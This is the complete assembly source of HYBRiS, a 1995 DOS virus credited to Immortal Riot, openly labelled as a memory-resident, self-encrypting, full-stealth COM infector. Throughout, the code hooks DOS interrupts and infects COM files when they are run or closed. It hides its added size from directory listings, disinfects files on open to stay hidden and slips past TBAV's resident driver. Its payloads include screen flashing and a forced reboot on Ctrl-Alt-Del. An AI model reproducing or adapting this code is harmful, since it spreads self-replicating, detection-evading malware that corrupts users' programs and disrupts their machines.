;===============================================================================
; HYBRiS (c) 1995 The Unforgiven/Immortal Riot
; Brief description:
; TSR COM-infecting, full-stealth virus
; Self-encrypted
; Wasn't scannable when it was released by FP/Tbav/AVP..
; Has quite some collection of grafical payloads (hoping to get AVP attention).
; Multipe interrupt handlers
; Int24h hooking
; Anti-anti-VSAFE-viruses.
; Special thanks to Priest & Stormbringer of Phalcon/Skism
;===============================================================================


    .model tiny
    .code
    org 100h

    vir_size equ virus_end-virus_start


virus_start:

    jmp entry_point

install:

    mov ax,99                           ;input  = rnd_value in AX
    call random                         ;output = (zero -> rnd_value)
    jne get                             ;if output=0, activate..
    mov cs:[activate_flag][bp],1

get:
    mov ax,108
    call random
    jne real_get

start_payload:
    call main_payload                   ;'loop' until ESC is being pressed..
    in al,60h
    cmp al,1
    jne start_payload
    jmp short real_get

main_payload:                           ;remake of a payload I wrote for
    mov ax,3                            ;IR#6..
    int 10h
    push ax
    push cx
    push dx
    mov ax,03f00h
    mov dx,03c8h
    out dx,al
    inc dx
    mov ax,-1
    out dx,al
    xchg al,ah
    out dx,al
    xchg al,ah
    out dx,al
    mov cx,-1
    loop $
    dec dx
    xor ax,ax
    out dx,al
    inc dx
    out dx,al
    out dx,al
    out dx,al
    pop dx
    pop cx
    pop ax
    ret

real_get:
    mov ah,4ah                      ;Residency routine combined with
    mov bx,-1                       ;installation check
    mov cx,0d00dh
    int 21h
    cmp ax,cx
    jne not_res
    jmp already_resident

not_res:
    mov ah,4ah                      ;resize mcb
    sub bx,(vir_size+15)/16+1       ;bx=size in para's
    int 21h                         ;es =segment

    mov ah,48h                      ;allocate memory block
    mov bx,(vir_size+15)/16         ;bx = size in para's
    int 21h                         ;returns pointer to the beginning
                                    ;of the new block allocated

    dec ax                          ;dec ES to get pointer to mcb
    mov es,ax                       ;es=segment
    mov word ptr es:[1],8           ;ofs:1 in mcb = owner, 8 = dos

    push cs                         ;cs=ds
    pop ds

    cld                             ;clear direction
    sub ax,0fh                      ;substact 15 from ax,
    mov es,ax                       ;thus es:[100h] = start of allocated memory
    mov di,100h                     ;di = 100h (beginning of file)
    lea si,[bp+offset virus_start]  ;si points to start of virus
    mov cx,(vir_size+1)/2           ;copy it resident with words
    rep movsw                       ;until cx = 0 (the whole virus copied)

    push es                         ;es=ds
    pop ds

    mov ax,3521h                    ;get interrupt vector from es:bx for
    int 21h                         ;int21h

tb_lup:
    cmp word ptr es:[bx],05ebh      ;all tbav's utils starts with this code,
    jne no_tbdriver                 ;if its found, get next interrupt handler
    cmp byte ptr es:[bx+2],0eah     ;and use that as the int21h adress
    jne no_tbdriver                 ;thereby, cutting tbav out from our
    les bx,es:[bx+3]                ;int21h handler. loop until it's out of
    jmp tb_lup                      ;there. (dunno if this works anymore..)

no_tbdriver:
    mov word ptr ds:[Org21ofs],bx   ;save segment:offset for int21h
    mov word ptr ds:[Org21seg],es   ;in a word each

    cmp byte ptr cs:[activate_flag][bp],1   ;check if we should activate
    jne skip_08_get                         ;the int8 handler

    mov al,08h                              ;if so, get interrupt-vector
    int 21h                                 ;for int8h
    mov word ptr ds:[org08ofs],bx
    mov word ptr ds:[org08seg],es

skip_08_get:
    mov al,09h                               ;int9
    int 21h
    mov word ptr ds:[org09ofs],bx
    mov word ptr ds:[org09seg],es

    mov al,16h                               ;16h
    int 21h
    mov word ptr ds:[org16ofs],bx
    mov word ptr ds:[org16seg],es

    mov dx, offset new_int21h                ;set new interrupt handlers
    mov ax,2521h                             ;to ds:dx for int21h
    int 21h

    cmp byte ptr cs:[activate_flag][bp],1   ;if we didnt get int8, dont
    jne skip_08_set                         ;set a new either!

    mov dx, offset new_08h
    mov al,08h
    int 21h

skip_08_set:
    mov dx,offset new_09h                    ;int9 handler installed
    mov al,09h
    int 21h

    mov dx,offset new_16h                    ;int 16h handler installed
    mov al,16h
    int 21h

already_resident:
tbdriver:
    mov di,100h
    push di                         ;save di at 100h
    push cs                         ;make cs=ds=es
    push cs
    pop es
    pop ds
    lea si,[bp+orgjmp]              ;and copy the first 4-init-bytes to
    movsw                           ;the beginning (in memory) so we can
    movsw                           ;return back to the host properly
    ret                             ;jmp di, 100h (since we pushed it above)

new_int21h:
    cmp ah,4ah                      ;installation check part at the beginning
    jne chk_vsafe                   ;no 4ah executed, try next option
    cmp bx,-1                       ;ah = 4ah, check if bx and cx is set by
    jne no_match                    ;our virus
    cmp cx,0d00dh
    jne no_match                    ;no.
    mov ax,cx                       ;move cx into ax
    iret                            ;and do a interrupt return

chk_vsafe:
    cmp ax,0fa01h                   ;a resident anti-virus-virus,
    jne chk_exec                    ;checker
    cmp dx,5945h
    je go_vsafe

chk_exec:
    cmp ax,4b00h                    ;Since this is a com infector only,
    je go_infect                    ;I don't have to check if al=0, still
                                    ;I do it :).

chk_close:
    cmp ah,3eh                      ;check for file-closes
    je go_close                     ; ==> infect

    cmp ah,3dh                      ;file open
    je go_disinfect                 ; ==> disinfect

chk_dir:
    cmp ah,11h                      ;stealth functions on
    je go_fcb_stealth               ;directory listenings with
    cmp ah,12h                      ;11/12/4e/4fh
    je go_fcb_stealth

    cmp ah,4eh
    je go_handle_stealth

    cmp ah,4fh
    je go_handle_stealth

no_match:
    jmp do_oldint21h                ;nothing matched!

go_vsafe:                           ;indirect-jumps due to 128d bytes jmp's
    jmp unload_vsafe                ;directives.

go_infect:
    jmp infect

go_close:
    call setcritical                ;if infect on close, install a critical
    jmp infect_close                ;error handler before

go_disinfect:
    call setcritical                ;disinfect calls also modifies programs,
    jmp disinfect_dsdx              ;install the int24h handler before trying
                                    ;doing disinfection

go_fcb_stealth:                     ;11 & 12h calls get's here, to be
    jmp hide_dir                    ;transfered into another routine
                                    ;(* Very unstructured programming *)

go_handle_stealth:
    jmp hide_dir2

dps db "THIS PROGRAM IS (C) 1995 IMMORTAL RIOT",0 ; no shit!

new_08h:
    push ax                               ;If the int08h installer is
    push dx                               ;installed, the screen background
    mov dx,03c8h                          ;color will fade to white return
    xor al,al                             ;to original color (black), and
    out dx,al                             ;'loop' that procedure all over again
    inc dx                                ;since its activated all the time by
    mov al,[cs:bgcol]                     ;dos internal services. .
    out dx,al
    out dx,al
    out dx,al
    inc [cs:bgcol]
    pop dx
    pop ax

    db 0eah
    org08ofs dw ?
    org08seg dw ?

bgcol db 0

new_09h:

    push ax                         ;preserve register in use
    push ds

    xor ax,ax
    mov ds,ax                       ;ds=0

    in al,60h                       ;read key
    cmp al,53h                      ;delete?
    jnz no_ctrl_alt_del             ;no!

    test byte ptr ds:[0417h],0ch    ;test for alt OR ctrl
    je no_ctrl_alt_del              ;
    jpo no_ctrl_alt_del             ;<- Wow. ctrl and alt?

    in al,40h                       ;A small randomizer, this gives us
    and al,111111b                  ;one in 64 I reckon :-).
    cmp al,111111b
    je no_ctrl_alt_del

    push cs
    pop ds

    mov ax,3                        ;set grafic mode and clear screen, too
    int 10h

    mov ah,2                        ;set cursor pos
    xor bh,bh
    mov dx,0A14h                    ;10,20d (middle)
    int 10h

    mov ah,1                        ;set cursor
    mov cx,2020h                    ;>nul
    int 10h

    mov si,offset dps               ;point to v_name, of sorts.

all_chars:
    loop all_chars
    lodsb                          ;load string by byte from dps
    or al,al                       ;end of string? (al=0)
    je cold_boot                   ;yes, make a cold boot

    mov ah,0Eh                     ;display character from string
    int 10h

    jmp short all_chars            ;put next char to string

cold_boot:
    db 0eah                         ;jmp far ptr
    db 00h, 00h, 0ffh,0ffh

no_ctrl_alt_del:
    pop ds                          ;restore registers
    pop ax

do_oldint09h:
    db 0eah                         ;and jump to saved vector for int09h
    org09ofs dw ?
    org09seg dw ?


new_16h:
    cmp ax,0fa01h                   ;check ax for 'vsafe-unload-value'
    jne do_oldint16h                ;no match in ax.
    cmp dx,5945h                    ;check ds for 'vsafe-unload-value'
    jne do_oldint16h                ;no match in dx.
    jmp unload_vsafe                ;program is probably virus-infected.

do_oldint16h:
    db 0eah                         ;program is not trying to unload
    org16ofs dw ?                   ;vsafe..
    org16seg dw ?

hide_dir:                           ;FCB stealth routine
    pushf                           ;simulate a int call with pushf
    push cs                         ;and cs, ip on the stack
    call do_oldint21h
    or al,al                        ;was the dir call successfull??
    jnz skip_dir                    ;(i.e. did we find files?)

    push ax                         ;we did find files, save ax/bx/es
    push bx                         ;since we use them in this routine
    push es

    mov ah,62h                      ;get active PSP to es:bx
    int 21h
    mov es,bx
    cmp bx,es:[16h]                 ;PSP belongs to dos?
    jnz bad_psp                     ;no, just stealth on DIR (ie. command.com
                                    ;is the owner of the psp)

    mov bx,dx                       ;offset to unopened FCB in BX
    mov al,[bx]                     ;FCB-type in AL..
    push ax                         ;Save it
    mov ah,2fh                      ;Get DTA-area
    int 21h
    pop ax                          ;Restore AX
    inc al                          ;check if al=0 or al=ff
    jnz no_ext                      ;If it's not 0, then, it's not extended
    add bx,7                        ;if it's extended add 7 to skip garbage
no_ext:
    mov al,byte ptr es:[bx+17h]     ;get seconds field
    and al,1fh
    xor al,1dh                      ;is the file infected??
    jnz no_stealth                  ;if not - don't hide size

    cmp word ptr es:[bx+1dh],vir_size-3     ;if a file with same seconds
    jbe no_stealth                          ;as an infected is smaller -
    sub word ptr es:[bx+1dh],vir_size-3     ;don't hide size
no_stealth:
bad_psp:
    pop es                                  ;restore segments/registers
    pop bx                                  ;used and return to caller
    pop ax
skip_dir:
    iret

hide_dir2:                                  ;4e/4fh stealth

    pushf
    push cs
    call do_oldint21h

    jc no_files

    pushf
    push ax
    push di
    push es
    push bx

    mov ah,2fh
    int 21h

    mov di,bx
    add di,1eh
    cld
    mov cx,9                            ;scan for the '.' which seperates
    mov al,'.'                          ;the filename from the extension
    repne scasb
    jne not_inf                         ;<- Filename without any extension!

    cmp word ptr es:[di],'OC'
    jne not_inf                         ;most likely a com

    cmp byte ptr es:[di+2],'M'
    jne not_inf                         ;Definitly com

    mov ax,es:[bx+16h]                  ;ask file time
    and al,1fh
    xor al,1dh                          ;can the file be infected?
    jnz not_inf

    cmp word ptr es:[bx+1ah],vir_size       ;dont stealth too small
    ja  hide                                ;files

    cmp word ptr es:[bx+1ch],0              ;>64k? (no-com)
    je  not_inf                             ;don't stealth too large files..

hide:
    sub es:[bx+1ah],vir_size-3              ;stealth

not_inf:
    pop bx
    pop es
    pop di
    pop ax
    popf

no_files:
    retf 2

infect_close:                        ;3eh calls arrives at this entry
    push es
    push bp
    push ax
    push bx
    push cx
    push si
    push di
    push ds
    push dx
    cmp bx,4                        ;don't close null, aux and so
    jbe no_close

    call check_name                 ;es:di points to file name
    add di,8                        ;es:di points to extension
    cmp word ptr es:[di],'OC'
    jne no_close
    cmp byte ptr es:[di+2],'M'      ;es:di+2 points to 3rd char in extension
    je close_infection

no_close:
    pop dx                          ;no com-file being opened
    pop ds
    pop di
    pop si
    pop cx
    pop bx
    pop ax
    pop bp
    pop es

    jmp do_oldint21h


close_infection:
    or byte ptr es:[di-26h],2
    mov cs:Closeflag,1              ;mark that 3e-infection = on

    mov ax,4200h                    ;seek tof.
    xor cx,cx
    cwd
    int 21h

    jmp short infect_on_close       ;infect it

check_name:
    push bx
    mov ax,1220h                    ;get job file table for handle at es:di
    int 2fh

    mov ax,1216h                    ;get system file table
    mov bl,byte ptr es:[di]         ;for handle index in bx
    int 2fh
    pop bx
    add di,20h                      ;es:di+20h points to file name
    ret                             ;return

infect:
    push es
    push bp
    push ax
    push bx
    push cx
    push si
    push di
    push ds
    push dx

    call setcritical                ;install a critical error handler

    mov cs:Closeflag,0              ;make sure closeflag is off
    mov ax,4300h                    ;get attrib
    int 21h
    push cx                         ;save attrib onto the stack
    mov ax,4301h                    ;clear attrib
    xor cx,cx
    int 21h

    mov ax,3d00h                    ;open file in read mode only
    int 21h
    xchg ax,bx
    mov ax,1220h
    int 2fh
    push bx
    mov ax,1216h                   ;modify
    mov bl,byte ptr es:[di]
    int 2fh
    pop bx
    or byte ptr es:[di+2],2        ;to read & write mode in the SFT-entry

infect_on_close:                    ;entry for infection on 3eh


    push cs                         ;cs=ds
    pop ds

    mov ax,5700h                    ;get time/date
    int 21h
    push cx                         ;save time/date onto the stack
    push dx

    mov ah,3fh                      ;read first four bytes to orgjmp
    mov cx,4
    mov dx,offset ds:orgjmp
    int 21h

    cmp word ptr ds:orgjmp,'ZM'     ;check if .EXE file
    je exe_file
    cmp word ptr ds:orgjmp,'MZ'
    je exe_file                     ;if so - don't infect

    cmp byte ptr ds:orgjmp+3,'@'    ;dont reinfect!
    jne lseek_eof
    jmp skip_infect

exe_file:
    mov cs:exeflag,1                ;mark file as EXE-file, and
    jmp short skip_infect           ;don't set second value for it!

lseek_eof:
    mov ax,4202h                    ;go end of file, offset in dx:cx
    xor cx,cx                       ;and return file size in dx:ax.
    xor dx,dx
    int 21h

    cmp ax,(0FFFFH-Vir_size)        ;dont infect to big or
    jae skip_infect                 ;to small files
    cmp ax,(vir_size-100h)
    jb skip_infect

    add ax,offset entry_point-106h  ;calculate entry offset to jmp
    mov word ptr ds:newjmp[1],ax    ;move it [ax] to newjmp

get_rnd:
    mov ah,2ch                      ;get random number and put enc_val
    int 21h
    or dl,dl                        ;dl=0 - get another value!
    je get_rnd
    mov word ptr ds:enc_val,dx
    mov ax,08d00h                   ;copy entire virus to 8d00h:100h
    mov es,ax
    mov di,100h
    mov si,di
    mov cx,(vir_size+1)/2
    rep movsw
    push es
    pop ds
    xor bp,bp                       ;and encrypt it there
    call encrypt

    mov ah,40h                      ;write virus to file from position
    mov cx,virus_end-install        ;08d00h:100h
    mov dx,offset install
    int 21h

    push cs                         ;cs=ds
    pop ds

    mov ax,4200h                    ;go to beginning of file
    xor cx,cx
    cwd
    int 21h

    mov ah,40h                      ;and write a new-jmp-construct
    mov cx,4                        ;of 4 bytes (4byte=infection marker)
    mov dx,offset newjmp
    int 21h

skip_infect:
    mov ax,5701h                    ;restore
    pop dx                          ;date
    pop cx                          ;time
    cmp byte ptr cs:[exeflag],1     ;exe file?
    je skip_sec                     ;if so - keep the sec_value intact
    or cl,00011101b                 ;and give com-files second value
    and cl,11111101b                ;29

skip_sec:
    int 21h
    cmp byte ptr cs:[Closeflag],1   ;check if execute or close infeection,
    je dont_close                   ;if infect on close, dont close file

close_file:
    mov ah,3eh                      ;close the file which were executed
    int 21h
    pop cx                          ;get original file-attribs
dont_close:
    pop dx                          ;ds:dx = filename
    pop ds
    cmp byte ptr cs:[Closeflag],1
    je exit_close
    mov ax,4301h                    ;set back saved attribute
    int 21h

exit_close:
    mov byte ptr cs:closeflag,0
    call resetcritical              ;set back critical error handler int24h
    pop di
    pop si
    pop cx
    pop bx
    pop ax
    pop bp
    pop es                           ;restore registers in use

do_oldint21h:
O21h:
   db 0eah                          ;jmp far ptr
    org21ofs dw ?                   ;s:o to
    org21seg dw ?                   ;int21h

    ret                             ;call to DOS. . . return!

unload_vsafe:
    mov ah,9
    mov dx, offset v_name
    push ds
    push cs
    pop ds
    int 21h
    pop ds
    mov ax,4c00h                    ;exit program infected with an other
    int 21h                         ;virus.

v_name    db "[HYBRiS] (c) '95 =TU/IR=",'$'

closeflag     db 0
exeflag       db 0
activate_flag db 0

disinfect_dsdx:
     push ax
     push bx
     push cx
     push dx
     push di
     push si
     push ds
     push es                             ;save all regs/segs...

     push ds
     pop es                              ;ds=es

     mov cx,64                           ;scan for the dot which
     mov di,dx                           ;seperates filename from
     mov al,'.'                          ;extension
     cld                                 ;clear direction
     repne scasb                         ;
     jne nocom                           ;<- was no '.' in filename
                                         ;(aint likely a comfile)

     cmp word ptr ds:[di],'OC'
     je smallc
     cmp word ptr ds:[di],'oc'
     jne nocom

smallc:
     cmp byte ptr ds:[di+2],'M'
     je open_com
     cmp byte ptr ds:[di+2],'m'
     je open_com

nocom:
     jmp no_com_opened                    ;no com-file being opened!

open_com:

     mov ax,3d02h                         ;Tbav utils might intercept this
     pushf                                ;action.
     push cs
     call o21h
     xchg ax,bx

     push cs                              ;cs=ds=es
     pop ds
     push cs
     pop es

     mov ax,5700h                       ;get time
     int 21h
     push cx
     push dx

     and cl,1fh                         ;see if seconds = 29
     xor cl,1dh
     jne close_dis                      ;its not! (file = not infected)

     mov ah,3fh                         ;read first bytes of the infected
     mov cx,4                           ;program
     mov dx,offset ds:orgjmp
     int 21h

     cmp byte ptr ds:orgjmp,0e9h        ;first byte = jmp?
     jne close_dis

     cmp byte ptr ds:orgjmp+3,'@'       ;fourth byte = '@'?
     jne close_dis

     mov ax,4202h                        ;opened file is infected,
     mov cx,-1                           ;seek the location where we
     mov dx,-(virus_end-orgjmp)          ;stored the first bytes of the
     int 21h                             ;original program

     mov ah,3fh                          ;read those bytes to orgjmp
     mov cx,4
     mov dx,offset ds:orgjmp
     int 21h

     mov ax,4200h                        ;seek the beginning of file
     xor cx,cx
     xor dx,dx
     int 21h

     mov ah,40h                          ;write the original bytes to
     mov dx,offset orgjmp                ;the top of file
     mov cx,4
     int 21h

     mov ax,4202h                       ;seek (endoffile-virussize)
     mov cx,-1
     mov dx,-(virus_end-install)
     int 21h

     mov ah,40h                         ;truncate file
     xor cx,cx
     int 21h

close_dis:
     mov ax,5701h                        ;restore saved
     pop dx                              ;date
     pop cx                              ;and time
     int 21h                             ;

     mov ah,3eh                          ;close the file
     pushf
     push cs
     call o21h

no_com_opened:
     pop es
     pop ds
     pop si
     pop di
     pop dx
     pop cx
     pop bx
     pop ax

bail_out:
     jmp o21h                           ;and bail out!


random:
    push ds
    push bx
    push cx
    push dx
    push ax

    xor ax,ax
    int 1ah
    push cs
    pop ds
    in al,40h
    xchg cx,ax
    xchg dx,ax
    mov bx,offset ran_num
    xor ds:[bx],ax
    rol word ptr ds:[bx],cl
    xor cx,ds:[bx]
    rol ax,cl
    xor dx,ds:[bx]
    ror dx,cl
    xor ax,dx
    imul dx
    xor ax,dx
    xor ds:[bx],ax
    pop cx
    xor dx,dx
    inc cx
    je random_ret
    div cx
    xchg ax,dx
random_ret:
     pop dx
     pop cx
     pop bx
     pop ds
     or ax,ax
     ret


SetCritical:
    push ax ds
    mov ax,9
    mov ds,ax
    push word ptr ds:[0]
    push word ptr ds:[2]
    pop word ptr cs:[OldCritical+2]
    pop word ptr cs:[OldCritical]
    mov word ptr ds:[0],offset CriticalError
    push cs
    pop word ptr ds:[02]
    pop ds
    pop ax
    ret

ResetCritical:
    push ax
    push ds
    push word ptr cs:[OldCritical]
    mov ax,9
    push word ptr cs:[OldCritical+2]
    mov ds,ax
    pop word ptr ds:[2]
    pop word ptr ds:[0]
    pop ds
    pop ax
    ret

CriticalError:                          ;new int24h handler
    mov     al,3                        ;returns no error
    iret

OldCritical     dd      0               ;dw 0,0
ran_num         dw      ?

decrypt:
encrypt:
    mov ax,word ptr ds:[bp+enc_val]         ;enc value in ax
    lea di,[bp+install]                     ;pointer to encryption start
    mov cx,(encrypt-install)/2              ;number of words to be encrypted
xor_loopy:
    xor word ptr ds:[di],ax
    inc di
    inc di
    loop xor_loopy
    ret
enc_val dw 0

entry_point:
   call get_bp                            ;to get the delta offset
                                          ;classic old trick..
get_bp:
   pop bp
   sub bp, offset get_bp

    call decrypt                            ;decrypt virus
    jmp install                             ;jmp to install code

newjmp    db 0e9h,00h,00h,'@'       ;buffer to calculate a new entry
orgjmp    db 0cdh,20h,00,00         ;buffer to save the 4 first bytes

virus_end:
end virus_start
================================================================================
